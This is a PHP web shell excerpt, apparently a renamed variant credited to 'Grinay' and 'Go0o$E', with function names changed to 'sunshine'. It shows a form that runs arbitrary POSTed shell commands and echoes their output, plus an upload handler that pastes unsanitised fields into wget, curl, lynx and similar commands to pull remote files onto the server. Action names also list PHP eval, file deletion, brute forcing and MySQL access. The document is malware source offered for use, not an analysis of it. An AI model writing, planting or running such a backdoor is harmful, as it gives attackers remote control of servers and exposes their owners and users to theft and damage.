...
$header='<html><head><title>sunshine</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">'.$style.'</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';
$footer='</body></html>';
$lang=array(
...
'allfuncsh'=>'All function for work sunshine was disabled.'
);

$act=array('viewer','editor','upload','sunshine','phpeval','download','delete','deletedir','brute','mysql');//here added new actions
...
function sunshine($cmd)
{
 ...
 if (!empty($cmd))
 {
  ...
  elseif(function_exists('sunshine_exec')){$ret = @sunshine_exec($cmd);}
...
<input type=\"hidden\" name=\"action\" value=\"sunshine\">
<textarea name=\"command\" rows=\"5\" cols=\"150\">".@$_POST['command']."</textarea><br>
<textarea readonly rows=\"15\" cols=\"150\">".convert_cyr_string(htmlspecialchars(sunshine($_POST['command'])),"d","w")."</textarea><br>
...
if(isset($_POST['upload'])){
	...
	switch($_POST['with'])
	{
	  case wget:sunshine(which('wget')." ".$_POST['urldown']." -O ".$_POST['filename']."");break;
 	  case fetch:sunshine(which('fetch')." -o ".$_POST['filename']." -p ".$_POST['urldown']."");break;
 	  case lynx:sunshine(which('lynx')." -source ".$_POST['urldown']." > ".$_POST['filename']."");break;
 	  case links:sunshine(which('links')." -source ".$_POST['urldown']." > ".$_POST['filename']."");break;
 	  case GET:sunshine(which('GET')." ".$_POST['urldown']." > ".$_POST['filename']."");break;
 	  case curl:sunshine(which('curl')." ".$_POST['urldown']." -o ".$_POST['filename']."");break;
}}}
//Brute
if($action=="brute"){
...
<br></table><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#44474f BORDER=1 width=100% align=center bordercolor=#808080 bordercolorlight=black bordercolordark=#44474f><tr><td><center><font color='#9acd32' face='Tahoma' size = 2><b>| COPYRIGHT BY sunshine.RU | Made by Grinay | Modified by Go0o$E |</b></font></center></td></tr></table><?=$footer;?>
